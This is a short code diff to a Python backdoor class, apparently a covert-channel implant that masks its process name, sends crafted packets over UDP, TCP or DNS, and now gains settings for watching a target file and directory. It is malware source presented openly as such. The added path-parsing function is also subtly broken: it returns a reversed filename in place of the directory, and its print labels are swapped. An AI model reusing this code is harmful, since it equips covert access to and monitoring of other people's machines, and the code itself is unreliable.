@@ -134,6 +134,9 @@ class BackDoor:
         self.device = ""
         self.supported_protos = ["udp", "tcp", "dns"]
         self.proto = ""
+        self.watch_dir = ""
+        self.watch_file = ""
+        self.watch_status = False
 
     def start(self):
         self.process_yaml()
@@ -175,13 +178,25 @@ class BackDoor:
         self.device = config['covert']['device']
         self.recv_port = config['covert']['recv_port']
         self.send_port = config['covert']['send_port']
-        self.proto = config['covert']['proto']
+        self.proto = config['share']['proto']
+        self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
         print(f"device is {self.device}")
         print(f"Send is {self.send_port}")
         print(f"recv is {self.recv_port}")
         print(f"proto  is {self.proto}")
+        print(f"file  is {self.watch_dir}")
+        print(f"dir  is {self.watch_file}")
+
+    def watch_settings(self, path) -> tuple[str,str]:
+        file = path.split("/")[-1]
+        dir = ""
+        for i in range(len(path)-1, -1, -1):
+            if path[i] == "/":
+                return dir, file
+            dir += path[i]
+
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
